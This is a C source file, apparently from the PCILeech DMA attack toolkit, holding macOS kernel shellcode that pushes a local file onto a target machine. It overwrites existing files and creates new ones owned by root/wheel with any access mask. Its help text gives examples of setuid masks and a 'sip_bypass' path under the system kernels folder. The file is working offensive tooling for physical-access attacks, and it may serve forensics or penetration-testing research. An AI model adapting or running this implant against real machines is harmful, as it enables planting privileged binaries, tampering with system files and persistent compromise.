// macos_filepush.c : kernel code to push files to target system.
// Compatible with Apple macOS.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel macos_filepush.c
// ml64.exe macos_common_a.asm /Femacos_filepush.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main macos_filepush.obj macos_common.obj
// shellcode64.exe -o macos_filepush.exe "PUSH FILES TO TARGET SYSTEM                                    \nAPPLE macOS EDITION                                            \n===============================================================\nPush a file from the local system to the target system.        \nWARNING! Existing files will be overwritten!                   \n* Files created will be created with root/wheel as owner/group \n  and get the access mask specified in the -0 parameter.       \n* Files overwritten will keep the access mask and owner/group. \nREQUIRED OPTIONS:                                              \n  -in  : file to push to target system from this system.       \n         filename is given in normal format.                   \n         Example: '-in c:\temp\random.txt'                     \n  -s : file on target system.                                  \n         Example: '-s /System/Library/Kernels/sip_bypass'      \n  -0   : file access mask in HEXADECIMAL OR DECIMAL FORMAT!    \n         NB! linux file masks are ususally typed in octal -    \n         -rwsr-xr-x 4755 (oct) = 2541 (decimal) = 0x9ed (hex)  \n         -rwxrwxrwx  777 (oct) =  511 (decimal) = 0x1ff (hex)  \n         Example: '-0 0x1ff'                                   \n  -1   : run flag - set to non zero to push file.              \n===== PUSH ATTEMPT DETAILED RESULT INFORMATION ================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n===============================================================\n"
//
#include "macos_common.h"

#define CONFIG_MAX_FILESIZE			0x180000 // 1.5MB

typedef struct tdFN2 {
	QWORD vnode_open;
	QWORD vnode_close;
	QWORD VNOP_WRITE;
	QWORD uio_addiov;
	QWORD uio_create;
	QWORD uio_free;
	QWORD vfs_context_current;
} FN2, *PFN2;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	QWORD i = 0, NAMES[sizeof(FN2) / sizeof(QWORD)], *pfn_qw = (PQWORD)pfn2;
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'o', 'p', 'e', 'n', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'c', 'l', 'o', 's', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'W', 'R', 'I', 'T', 'E', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'a', 'd', 'd', 'i', 'o', 'v', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'c', 'r', 'e', 'a', 't', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'u', 'i', 'o', '_', 'f', 'r', 'e', 'e', 0 };
	NAMES[i++] = (QWORD)(CHAR[]) { '_', 'v', 'f', 's', '_', 'c', 'o', 'n', 't', 'e', 'x', 't', '_', 'c', 'u', 'r', 'r', 'e', 'n', 't', 0 };
	for(i = 0; i < sizeof(FN2) / sizeof(QWORD); i++) {
		pfn_qw[i] = LookupFunctionMacOS(pk->AddrKernelBase, (CHAR*)NAMES[i]);
		if(!pfn_qw[i]) { return FALSE; }
	}
	return TRUE;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	DWORD status = 0;
	QWORD uio = 0, vnode = 0, vfs_current;
	if(!pk->dataInStr[0] || !pk->dataIn[0]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(pk->fn.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
	vfs_current = SysVCall(fn2.vfs_context_current);
	if(SysVCall(fn2.vnode_open, pk->dataInStr, 0x0602 /* WRITE|CREATE|TRUNCATE */, pk->dataIn[0], 0, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
	uio = SysVCall(fn2.uio_create, 1 /* count iov */, 0 /* offset */, 2 /* kernel addr */, 1 /* write */);
	if(SysVCall(fn2.uio_addiov, uio, pk->DMAAddrVirtual + pk->dataInExtraOffset, pk->dataInExtraLength)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
	if(SysVCall(fn2.VNOP_WRITE, vnode, uio, 0, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
error:
	if(uio) {
		SysVCall(fn2.uio_free, uio);
	}
	if(vnode) {
		SysVCall(fn2.vnode_close, vnode, 0x10000 /* descriptor written */, vfs_current);
	}
	pk->dataOut[0] = status;
}